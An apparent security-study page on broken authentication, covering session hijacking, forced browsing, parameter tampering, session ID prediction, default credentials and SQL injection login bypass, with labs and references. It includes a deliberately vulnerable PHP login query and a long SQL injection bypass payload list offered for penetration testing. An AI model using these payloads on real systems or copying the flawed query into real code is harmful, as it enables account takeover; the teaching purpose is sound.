# Broken authentication

Broken authentication refers to anything that lets someone log in to an account they’re not supposed to have access to. It means that there are vulnerabilities present in a particular website or application that lets an attacker sidestep the standard security measures in order to gain unauthorized entry. Basically, they are trying to log into a victim’s account like normal, with all the regular capabilities and functionality. Since they are impersonating the user, they can perform actions under the guise of their identity and may be able to view sensitive personal and financial information, as well.

<h3>Broken authentication has two different types of Vulnerabilities – </h3>
<ol>
  <li><a href=#session-management-vulnerabilities>Session Management Vulnerabilities</a></li>
  <li><a href=#credential-management-vulnerabilities>Credential Management Vulnerabilities</a> </li>
 </ol>
 
 # Session Management Vulnerabilities
 
  <p>In Session Management Vulnerabilities a session ID is created and assigned to a user whenever they log in to a site. The session ID is used to track what the user does and helps the site respond to the user’s actions.<br>
  <br>
  If an attacker can get a hold of a user’s session ID while they are logged in, then that is essentially as good as having their password. They can use the stolen session ID to impersonate the user and perform actions within the website. The image below illustrates how a session hijacking attack works:
  </p>
  
  ![image](https://user-images.githubusercontent.com/94695985/161239872-ddc527a0-08c5-4cbb-a330-1f669ace1ef8.png)
  
 
 # Credential Management Vulnerabilities
 
   <p>
  The theft of usernames and passwords is the first thing that usually comes to mind when we think of attackers gaining unauthorized access to an application. Proper credential management is critical for the users of any system, and applications themselves must take all possible precautions when dealing with passwords and their creation.<br>
  <br>
  In this case, broken authentication occurs when a site fails to protect its users from attackers that try to gain access via hacked or stolen passwords.
   </p>
   
 # Types of Broken Authentication Attacks
 
  <ol>
  <li><a href=#session-hijacking>Session Hijacking</a> </li>
  <li><a href=#credential-stuffing>Credential Stuffing</a </li>
  <li><a href=#password-spraying>Password Spraying</a </li>
  <li><a href=#phishing-attacks>Phishing Attacks</a </li>
 </ol>
 
 # Session Hijacking
   As we touched on earlier, hackers can use stolen session IDs to gain unauthorized access to a system and impersonate the victim within. These kinds of attacks can occur through attack vectors such as phishing attacks, public wi-fi sniffing, or malware.
   
   ![image](https://user-images.githubusercontent.com/94695985/161243278-1d936b26-2bdd-4b94-87bb-61feacffeb8b.png)

 
 # Credential Stuffing
   When databases of unencrypted login credentials are leaked, hackers can use automated tools to test out the entries and determine if any are still valid. This is essentially a kind of brute force attack, and many applications have protections to guard against this method.
   ![image](https://user-images.githubusercontent.com/94695985/161243420-40734415-114c-408e-a090-4e4cd4451bdf.png)

 
 # Password Spraying
   This is somewhat similar to Credential Stuffing in that it is a type of brute force attack. In this case though, attackers use lists of the most common and weak passwords. And as we saw earlier, this method often pays off considering how often “password”, “123456”, and similar strings are used as passwords. Password-complexity requirements help protect against Password Spraying. You can see some of the most commonly used (and therefore worst) passwords below:
   ![image](https://user-images.githubusercontent.com/94695985/161243571-a0fc3af6-45f1-4660-82ed-23e81f1f9580.png)

 
 # Phishing Attacks
   Here, hackers use an authentic-looking login screen (like the one seen below) in an attempt to trick users into providing their credentials. These kinds of attempts can be prevented by avoiding suspicious links, verifying the website in question, and following email security best practices. Admins can protect their users’ accounts by implementing multi-factor authentication, so even if a phishing attack is successful there’ll be another hurdle the hacker has to clear before getting account access.
   ![image](https://user-images.githubusercontent.com/94695985/161243804-decb185c-ce65-441a-9a79-72ba166c39da.png)
    
  
# Authentication Bypass 
Authentication bypass vulnerability could allow attackers to perform various malicious operations by bypassing the device authentication mechanism.
			
An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place. 
			
There are several methods of bypassing the authentication schema that is used by a web application:
 
<ol>   
<li><a href="#1-direct-page-request-forced-browsing">Direct Page Request</a> </li>
<li><a href="#2-parameter-modification">Parameter Modification</a> </li>
<li><a href="#3-session-id-prediction">Session ID Prediction</a> </li>
<li><a href="#4-sql-injections">SQL Injections</a> </li></ol>

 
    
## 1. Direct Page Request ('Forced Browsing')
					
The web application does not adequately enforce appropriate authorization on all restricted URLs, scripts, or files. 
					
Forced browsing, also called forceful browsing, is an attack technique against badly protected websites and web applications, which allows the attacker to access resources that they should not be able to access. Such resources may contain sensitive information. Forced browsing is a common web application security issue caused by careless coding.
										 
<b>Example:</b>		</br>			
If a web application implements access control only on the log in  page, the authentication schema could be bypassed. For example, if a  user directly requests a different page via forced browsing, that page  may not check the credentials of the user before granting access.  Attempt to directly access a protected page through the address bar in  your browser to test using this method.
    
    
![figure1](https://user-images.githubusercontent.com/83446765/161322243-95fd9645-8209-44b5-ab58-13b852aaa29b.png)
	 
## <li>Forced browsing</li></br>
										
Forced browsing is an attack where the aim is to enumerate and access resources that are not referenced by the application, but are still accessible.</br>
	  
An attacker can use Brute Force techniques to search for unlinked contents in the domain directory, such as temporary directories and files, and old backup and configuration files. These resources may store sensitive information about web applications and operational systems, such as source code, credentials, internal network addressing, and so on, thus being considered a valuable resource for intruders.</br>
	  
This attack is performed manually when the application index directories and pages are based on number generation or predictable values, or using automated tools for common files and directory names. </br>
	  
This attack is also known as Predictable Resource Location, File Enumeration, Directory Enumeration, and Resource Enumeration. </br>

<b>Example 1 </b></br>
This example presents a technique of Predictable Resource Location attack, which is based on a manual and oriented identification of resources by modifying URL parameters. The user1 wants to check their on-line agenda through the following URL: </br>

 ` www.site-example.com/users/calendar.php/user1/20070715  `
 
In the URL, it is possible to identify the username (âuser1â) and the date (mm/dd/yyyy). If the user attempts to make a forced browsing attack, they could guess another user’s agenda by predicting user identification and date, as follow: </br>

 ` www.site-example.com/users/calendar.php/user6/20070716  `
 
The attack can be considered successful upon accessing other user’s agenda. A bad implementation of the authorization mechanism contributed to this attack’s success. </br>

<b>Example 2 </b></br>
This example presents an attack of static directory and file enumeration using an automated tool. </br>

A scanning tool, like Nikto, has the ability to search for existing files and directories based on a database of well-know resources, such as: </br>

` /system/ /password/ /logs/ /admin/ /test/ `

When the tool receives an âHTTP 200â message it means that such resource was found and should be manually inspected for valuable information.</br>
	  
## <li>Predictable Resource Location</li></br>
					
The developer of a website or web application uses simple  authentication. Once a user is authenticated, they can access any URL of  the site.
The attacker is a user of the site. They first access the following web page:

` https://www.example.com/userdata.php?id=2258 `
					
Then, they enter the following URL into the browser address bar, attempting to use a URL parameter representing another user:
					
` https://www.example.com/userdata.php?id=2262 ` 
					
If authentication is too simple, they are able to attain access to  sensitive data belonging to any other user. They may also try the  following ID:
					
` https://www.example.com/userdata.php?id=1`
					
In many cases, ID=1 may belong to an admin user and the page may  contain valuable information that will enable the attacker to escalate  their attack.
					
					
## <li>Accessing Common Files and Directories</li></br>
					
Forced browsing is closely related to other similar web application security issues such as insecure direct object references and directory listing.  For example, if a web server has directory listing turned on, forced  browsing may enable the attacker to access crucial information. Here are  some examples:

` https://www.example.com/source-code/ `

In this example, the web server has directory listing turned on and the attacker guesses a common directory name source-code, thus getting access to the entire source code structure of the web application.

` https://www.example.com/configuration/ `  

In this case, the attacker gets access to all the web application configuration files. Some of those files may contain sensitive information such as access passwords for databases.  

` https://www.example.com/backup/ ` 

This time, the attacker gains access to all the backup files for the web application, which may, for example, include a database dump.
					 
## 2. Parameter Modification
			
The Web Parameter Tampering attack is based on the manipulation of parameters exchanged between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etc. Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase application functionality and control.</br></br>
This attack can be performed by a malicious user who wants to exploit the application for their own benefit, or an attacker who wishes to attack a third-person using a Man-in-the-middle attack.</br>
					
An attacker can tamper with URL parameters directly. For example, consider a web application that permits a user to select their profile from a combo box and debit the account:</br>
    
` http://www.attackbank.com/default.asp?profile=741&debit=1000 `
    
In this case, an attacker could tamper with the URL, using other values for profile and debit:
    
` http://www.attackbank.com/default.asp?profile=852&debit=2000 `
    
Other parameters can be changed including attribute parameters. In the following example, it's possible to tamper with the status variable and delete a page from the server:
    
` http://www.attackbank.com/savepage.asp?nr=147&status=read `
    
Modifying the status variable to delete the page:
    
` http://www.attackbank.com/savepage.asp?nr=147&status=del `
							
				
## 3. Session ID Prediction
			
The session prediction attack focuses on predicting session ID values that permit an attacker to bypass the authentication schema of an application. By analyzing and understanding the session ID generation process, an attacker can predict a valid session ID value and get access to the application.</br>
In the first step, the attacker needs to collect some valid session ID values that are used to identify authenticated users. Then, they must understand the structure of session ID, the information that is used to create it, and the encryption or hash algorithm used by application to protect it. Some bad implementations use sessions IDs composed by username or other predictable information, like timestamp or client IP address. In the worst case, this information is used in clear text or coded using some weak algorithm like base64 encoding.</br>
In addition, the attacker can implement a brute force technique to generate and test different values of session ID until they successfully get access to the application.</br>
					
<b>Example:</b> </br>
The session ID information for a certain application is normally composed by a string of fixed width. Randomness is very important to avoid its prediction. Looking at the example in Figure 1, the session ID variable is represented by JSESSIONID and its value is “user01”, which corresponds to the username. By trying new values for it, like “user02”, it could be possible to get inside the application without prior authentication.
    
![figure2](https://user-images.githubusercontent.com/83446765/161322254-095fb755-905d-4c0c-a23a-87d599aaeb94.png)
    
## 4. SQL Injections

				
SQL Injection (HTML Form Authentication)</br>
SQL Injection is a widely known attack technique. This section is not  going to describe this technique in detail as there are several  sections in this guide that explain injection techniques beyond the  scope of this section.
    
![figure3](https://user-images.githubusercontent.com/83446765/161322256-89be17ca-2e90-48ab-9475-a129e178b3e1.png)
    
The following figure shows that with a simple SQL injection attack, it is sometimes possible to bypass the authentication form.
    
![figure4](https://user-images.githubusercontent.com/83446765/161322260-335b849b-44ba-4998-b92c-9cb09c7b9f69.png)
    
# Authentication Bypass using SQL Injections

Bypass the authentication of a vulnerable login page using SQL injection. (Login Bypass Using SQL Injection)
			
First let us see an example of piece of code that actually creates the Login Page vulnerable to this attack.
			
<b>Example:</b>
			
			$uname=$_POST['uname'];
			$passwrd=$_POST['passwrd'];
			$query="select username,pass from users where username='$uname' and password='$passwrd' limit 0,1";
			$result=mysql_query($query);
			$rows = mysql_fetch_array($result);
			if($rows)
			{
			echo "You have Logged in successfully" ;
			create_session();
			}
			else
			{
			Echo "Better Luck Next time";
			}			
			
What we can see above is a PHP code which takes the user Input put  into the SQL Query and then check if any row is returned it allow you to get Log in.
			
Now as we can see the query is quoting the input with single quote, that means we have to use a single quote to close the first quote and then inject.
			
So lets Inject ` ' or ''=' ` into the Query:

Logging in with following details: </br>
`Username : ' or ''=' `  </br>
`Password : ' or ''='`   </br>


			select username,pass from users where username='' or ''='' and password='' or ''='' limit 0,1;




so what i actually did is made the query to return true using the or. We can even try and comment out the query using any comment operator like using the following username and password. </br>

`Username : ' or 1-- `   </br>
`Password :          `    </br>

 what we did is we left the password field empty and commented out the rest of the query. so lets try and check the Query part.


			select username,pass from users where username='' or true--' and password='' or ''='' limit 0,1;




Here anything after -- wont be executed which makes the query to be:   </br>


		`	select username,pass from users where username='' or true;`




and it will return all the rows. and we can bypass the Login. This was the basic okay let us assume now different queries and different injection for them.

Query:

			select username,pass from users where username=('$username') and password=('$passwrd') limit 0,1;


Injections:

                     ') or true--
                     ') or ('')=('
                     ') or 1--
                     ') or ('x')=('

Query:

			select username,pass from users where username="$username" and password="$passwrd" limit 0,1;



Injections:

			" or true--
			" or ""="
			" or 1--
			" or "x"="

Query:

			select username,pass from users where username=("$username") and password=("$passwrd") limit 0,1;


Injections:

	          	") or true--
			") or ("")=("
			") or 1--
			") or ("x")=("

Query:

			select username,pass from users where username=(('$username')) and password=(('$passwrd')) limit 0,1;



Injections:

			')) or true--
			')) or ((''))=(('
			')) or 1--
			')) or (('x'))=((' 


This list can be used by penetration testers when testing for SQL injection authentication bypass.A penetration tester can use it manually or through burp in order to automate the process.
						
			
			or 1=1
			or 1=1--
			or 1=1#
			or 1=1/*
			admin' --
			admin' #
			admin'/*
			admin' or '1'='1
			admin' or '1'='1'--
			admin' or '1'='1'#
			admin' or '1'='1'/*
			admin'or 1=1 or ''='
			admin' or 1=1
			admin' or 1=1--
			admin' or 1=1#
			admin' or 1=1/*
			admin') or ('1'='1
			admin') or ('1'='1'--
			admin') or ('1'='1'#
			admin') or ('1'='1'/*
			admin') or '1'='1
			admin') or '1'='1'--
			admin') or '1'='1'#
			admin') or '1'='1'/*
			1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
			admin" --
			admin" #
			admin"/*
			admin" or "1"="1
			admin" or "1"="1"--
			admin" or "1"="1"#
			admin" or "1"="1"/*
			admin"or 1=1 or ""="
			admin" or 1=1
			admin" or 1=1--
			admin" or 1=1#
			admin" or 1=1/*
			admin") or ("1"="1
			admin") or ("1"="1"--
			admin") or ("1"="1"#
			admin") or ("1"="1"/*
			admin") or "1"="1
			admin") or "1"="1"--
			admin") or "1"="1"#
			admin") or "1"="1"/*
			1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
		


# Default Credentials

Many web applications and hardware devices have default passwords for the built-in administrative account. Although in some cases these can be randomly generated, they are often static, meaning that they can be easily guessed or obtained by an attacker.

Additionally, when new users are created on the applications, these may have predefined passwords set. These could either be generated automatically by the application, or manually created by staff. In both cases, if they are not generated in a secure manner, the passwords may be possible for an attacker to guess.

Testing for default credentials of common applications, Testing for default password of new accounts.

How to Test

## Testing for Vendor Default Credentials

The first step to identifying default passwords is to identify the software that is in use.

Once the software has been identified, try to find whether it uses default passwords, and if so, what they are. This should include:

    Searching for “[SOFTWARE] default password”.
    Reviewing the manual or vendor documentation.
    Checking common default password databases, such as CIRT.net, SecLists Default Passwords or DefaultCreds-cheat-sheet.
    Inspecting the application source code (if available).
    Installing the application on a virtual machine and inspecting it.
    Inspecting the physical hardware for stickers (often present on network devices).

If a default password can’t be found, try common options such as:

    “admin”, “password”, “12345”, or other common default passwords.
    An empty or blank password.
    The serial number or MAC address of the device.

Or Alternatively, try common options such as “admin”, “root”, or “system”.

<a href="https://www.qualys.com/docs/qualys-vm-scanning-default-credentials.pdf">Scanning for Default Credentials & Commonly Used Passwords</a>

## Testing for Organization Default Passwords

When staff within an organization manually create passwords for new accounts, they may do so in a predictable way. This can often be:

    A single common password such as “Password1”.
    Organization specific details, such as the organization name or address.
    Passwords that follow a simple pattern, such as “Monday123” if account is created on a Monday.

These types of passwords are often difficult to identify from a black-box perspective, unless they can successfully be guessed or brute-forced. However, they are easy to identify when performing grey-box or white-box testing.

## Testing for Application Generated Default Passwords

If the application automatically generates passwords for new user accounts, these may also be predictable. In order to test these, create multiple accounts on the application with similar details at the same time, and compare the passwords that are given for them.

The passwords may be based on:

    A single static string shared between accounts.
    A hashed or obfuscated part of the account details, such as md5($username).
    A time-based algorithm.
    A weak pseudo-random number generator (PRNG).

This type of issue of often difficult to identify from a black-box perspective.

# Failure to Invalid Session after Password Change

Failure to Invalidate Session > On Password Reset and/or Change
						
discovered that the application Failure to invalidate session after password.  In this scenario changing the password doesn't destroys the other sessions which are logged in with old passwords.
			
Step By Step:
->Login with the same account in Chrome and Firefox Simultaneously->Change the pass in Chrome Browser->Go to firefox and Update any information, information will be update *If attacker login with firefox and user know his password stolen so even user change their password, his account remain insecure and attacker have full access of victim account.

Mitigation
When some change in user password, each and every active sessions that belongs to that particular account must be destroyed!I would like to recommend you to add a process that asks users whether user want to close all open sessions or not right after changing password.
So there is two way, either you let users to choose if they want to keep active sessions or just destroy every active sessions when an users change his/her password!
			
						
Impact
If attacker have user password and logged in different places, As other sessions is not destroyed, attacker will be still logged in your account even after changing password, cause his session is still active.. Malicious actor can complete access your account till that session expires! So, your account remains insecure even after the changing of password
   
    
    
    
    
    
 # Labs For Practice
   https://portswigger.net/web-security/authentication
   
   https://juice-shop.herokuapp.com/#/
   
   https://bwapp.hakhub.net/portal.php
   
   https://dvwa.co.uk/
    
 # Top Findings
   https://hackerone.com/reports/121469
    
   https://hackerone.com/reports/17474
    
   https://hackerone.com/reports/206650
    
   https://hackerone.com/reports/634488
   
   https://hackerone.com/reports/514577
   
   https://hackerone.com/reports/398797
   
   https://hackerone.com/reports/1195325
   
   https://hackerone.com/reports/195163
    
 # Reference
   https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication
    
   https://www.thesslstore.com/blog/everything-you-need-to-know-about-broken-authentication/
   
  <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema">Direct Page Request & SQL Injections</a></br>
  
   <a href="https://owasp.org/www-community/attacks/Forced_browsing"> Forced Browsing</a></br>
   
  <a href="https://www.acunetix.com/blog/web-security-zone/what-is-forced-browsing/">Predictable Resource Location & Accessing Common Files and Directories</a></br>
  
  <a href="https://owasp.org/www-community/attacks/Web_Parameter_Tampering">Parameter Modification</a></br>
  
  <a href="https://owasp.org/www-community/attacks/Session_Prediction">Session ID Prediction</a></br>
  
  <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html">Authentication Bypass using SQL Injections</a></br>
  
  <a href="https://hackerone.com/reports/514577"> Failure to Invalid Session after Password Change</a></br>
  
   <a href="https://cyware.com/news/authentication-bypass-vulnerability-what-is-it-and-how-to-stay-protected-ccc2ea38">Authentication <a href="https://capec.mitre.org/data/definitions/115.html">Bypass</a></a></br>
  
  <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/"> SQL Injection Payload List</a></br>
